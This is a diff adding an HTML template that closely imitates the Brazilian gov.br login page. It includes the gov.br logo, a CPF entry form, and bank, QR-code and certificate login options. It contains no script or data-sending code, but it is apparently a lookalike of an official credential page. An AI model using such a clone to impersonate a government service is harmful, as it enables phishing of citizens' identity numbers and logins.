@@ -1,0 +1,113 @@
+<div class="gov-login-page">
+
+  <!-- Cabeçalho gov.br -->
+  <header class="gov-header">
+    <div class="gov-header-left">
+      <div class="govbr-logo">
+        <span class="govbr-g">g</span>
+        <span class="govbr-o">o</span>
+        <span class="govbr-v">v</span>
+        <span class="govbr-br">.br</span>
+      </div>
+    </div>
+
+    <div class="gov-header-right">
+      <button type="button" class="header-link">Alto Contraste</button>
+      <button type="button" class="header-link">VLibras</button>
+    </div>
+  </header>
+
+  <!-- Conteúdo principal -->
+  <main class="gov-main">
+    <div class="gov-main-wrapper">
+
+      <!-- Lado esquerdo: imagem + texto -->
+      <section class="gov-left">
+        <div class="left-card">
+          <img
+            src="conta_govbr_v2.jpg"
+            alt="Conta gov.br"
+            class="left-image"
+          />
+        </div>
+      </section>
+
+      <!-- Lado direito: painel de login -->
+      <section class="gov-right">
+        <div class="login-card">
+          <h2 class="login-title">Identifique-se no gov.br com:</h2>
+
+          <div class="login-main-option">
+            <div class="login-main-icon">
+              <i class="bi bi-person-badge"></i>
+            </div>
+            <div>
+              <div class="login-main-title">Número do CPF</div>
+              <div class="login-main-sub">
+                Digite seu CPF para criar ou acessar sua conta
+                <span class="inline-govbr">gov.br</span>
+              </div>
+            </div>
+          </div>
+
+          <form class="cpf-form">
+            <label for="cpf" class="cpf-label">CPF</label>
+            <input
+              id="cpf"
+              type="text"
+              class="form-control cpf-input"
+              placeholder="Digite seu CPF"
+            />
+
+            <button type="submit" class="btn btn-primary btn-continuar">
+              Continuar
+            </button>
+          </form>
+
+          <div class="login-divider"></div>
+
+          <div class="login-subtitle">Outras opções de identificação:</div>
+
+          <button type="button" class="alt-option alt-option-bank">
+            <div class="alt-left">
+              <i class="bi bi-bank"></i>
+              <span>Login com seu banco</span>
+            </div>
+            <span class="bank-badge">Login seguro</span>
+          </button>
+
+          <button type="button" class="alt-option">
+            <div class="alt-left">
+              <i class="bi bi-qr-code"></i>
+              <span>Login com QR code</span>
+            </div>
+          </button>
+
+          <button type="button" class="alt-option">
+            <div class="alt-left">
+              <i class="bi bi-file-earmark-lock"></i>
+              <span>Seu certificado digital</span>
+            </div>
+          </button>
+
+          <button type="button" class="alt-option">
+            <div class="alt-left">
+              <i class="bi bi-cloud-lock"></i>
+              <span>Seu certificado digital em nuvem</span>
+            </div>
+          </button>
+
+          <div class="login-help">
+            <a href="#" class="help-link">
+              Está com dúvidas e precisa de ajuda?
+            </a>
+            <a href="#" class="terms-link">
+              Termo de Uso e Aviso de Privacidade
+            </a>
+          </div>
+        </div>
+      </section>
+
+    </div>
+  </main>
+</div>
